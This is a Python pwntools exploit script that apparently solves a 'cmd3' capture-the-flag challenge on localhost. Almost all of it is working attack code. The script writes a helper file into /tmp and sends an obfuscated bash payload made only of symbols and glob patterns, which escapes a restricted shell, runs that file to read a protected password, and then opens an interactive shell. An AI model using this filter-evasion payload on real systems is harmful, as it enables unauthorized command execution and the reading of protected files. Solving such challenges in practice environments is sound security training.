from pwn import *


class CMD3Exploit:
    RESTRICTED_SHELL_EXPLOIT = "__=({+,+});___=${__[@]};____=$((($$/$$)));_____=${___:____:____};_______=$(((____+____)));________=$(((_______+____)));_________=$(((________+_______)));????/???;$(${_:_________:________}${_____}/???/_-_-)"

    def __init__(self):
        self.shell = remote('localhost', 9023)

    def create_tmp_file(self):
        self.shell.recvuntil("your password is in ")
        filename = self.shell.recvline()[:-1]
        print("FILENAME:", filename)
        with open("/tmp/_-_-", "w") as f:
            f.write("cat /home/cmd3_pwn/" + filename)

    def get_flag(self):
        self.shell.sendline(self.RESTRICTED_SHELL_EXPLOIT)
        self.shell.recvline()
        password = self.shell.recv(32)
        print("PASSOWRD", password)
        self.shell.sendline(password)

    def run(self):
        self.create_tmp_file()
        self.get_flag()
        self.shell.interactive()


if __name__ == '__main__':
    CMD3Exploit().run()
